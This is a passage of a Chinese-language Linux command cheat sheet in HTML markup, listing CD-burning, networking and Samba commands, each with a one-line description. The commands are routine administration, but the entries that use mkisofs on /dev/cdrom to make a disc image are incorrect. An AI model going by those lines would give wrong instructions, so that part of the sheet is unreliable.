从已经保存到软盘的备份中恢复MBR内容</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"><br></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"><strong>光盘</strong></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">cdrecord -v gracetime=2 dev=/dev/cdrom -eject blank=fast -force 清空一个可复写的光盘内容</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">mkisofs /dev/cdrom &gt; cd.iso 在磁盘上创建一个光盘的iso镜像文件</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">mkisofs /dev/cdrom | gzip &gt; cd_iso.gz 在磁盘上创建一个压缩了的光盘iso镜像文件</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">mkisofs -J -allow-leading-dots -R -V \"Label CD\" -iso-level 4 -o ./cd.iso data_cd 创建一个目录的iso镜像文件</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">cdrecord -v dev=/dev/cdrom cd.iso 刻录一个ISO镜像文件</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">gzip -dc cd_iso.gz | cdrecord dev=/dev/cdrom - 刻录一个压缩了的ISO镜像文件</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">mount -o loop cd.iso /mnt/iso 挂载一个ISO镜像文件</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">cd-paranoia -B 从一个CD光盘转录音轨到 wav 文件中</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">cd-paranoia -- \"-3\" 从一个CD光盘转录音轨到 wav 文件中（参数-3）</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">cdrecord --scanbus 扫描总线以识别scsi通道</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">dd if=/dev/hdc | md5sum 校验一个设备的md5sum编码，例如一张 CD</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"><br></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"><strong>网络 - （以太网和WIFI无线）</strong></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">ifconfig eth0 显示一个以太网卡的配置</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">ifup eth0 启用一个 'eth0' 网络设备</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">ifdown eth0 禁用一个 'eth0' 网络设备</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">ifconfig eth0 192.168.1.1 netmask 255.255.255.0 控制IP地址</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">ifconfig eth0 promisc 设置 'eth0' 成混杂模式以嗅探数据包 (sniffing)</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">dhclient eth0 以dhcp模式启用 'eth0'</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">route -n show routing table</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">route add -net 0/0 gw IP_Gateway configura default gateway</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">route add -net 192.168.0.0 netmask 255.255.0.0 gw 192.168.1.1 configure static route to reach network '192.168.0.0/16'</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">route del 0/0 gw IP_gateway remove static route</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">echo \"1\" &gt; /proc/sys/net/ipv4/ip_forward activate ip routing</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">hostname show hostname of system</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">host www.example.com lookup hostname to resolve name to ip address and viceversa(1)</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">nslookup www.example.com lookup hostname to resolve name to ip address and viceversa(2)</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">ip link show show link status of all interfaces</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">mii-tool eth0 show link status of 'eth0'</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">ethtool eth0 show statistics of network card 'eth0'</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">netstat -tup show all active network connections and their PID</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">netstat -tupl show all network services listening on the system and their PID</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">tcpdump tcp port 80 show all HTTP traffic</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">iwlist scan show wireless networks</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">iwconfig eth1 show configuration of a wireless network card</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">hostname show hostname</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">host www.example.com lookup hostname to resolve name to ip address and viceversa</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">nslookup www.example.com lookup hostname to resolve name to ip address and viceversa</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">whois www.example.com lookup on Whois database</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"><br></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"><strong>Microsoft Windows networks (SAMBA)</strong></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">nbtscan ip_addr netbios name resolution</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">nmblookup -A ip_addr netbios name resolution</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\"></p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', BlinkMacSystemFont, 'PingFang SC', 'Hiragino Sans GB', Tahoma, Helvetica, Arial, SimSun, Heiti, sans-serif;background-color:rgb(255,255,255);\">smbclient -L ip_addr/hostname show remote shares of a windows host</p><p style=\"margin-top:8px;margin-bottom:0px;text-indent:2em;font-size:14px;line-height:1.75;color:rgb(38,38,38);font-family:'-apple-system', 